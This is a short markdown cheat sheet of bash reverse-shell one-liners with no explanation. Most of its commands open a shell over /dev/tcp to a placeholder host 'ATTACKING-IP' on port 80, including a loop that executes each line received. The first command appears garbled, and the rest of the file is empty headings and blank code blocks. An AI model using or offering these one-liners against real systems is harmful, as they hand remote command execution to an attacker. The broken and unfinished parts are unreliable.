# Bash Reverse Shells

```bash
exec /bin/bash 0&0 2>&0

```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

```
```bash
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

#

```
```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```
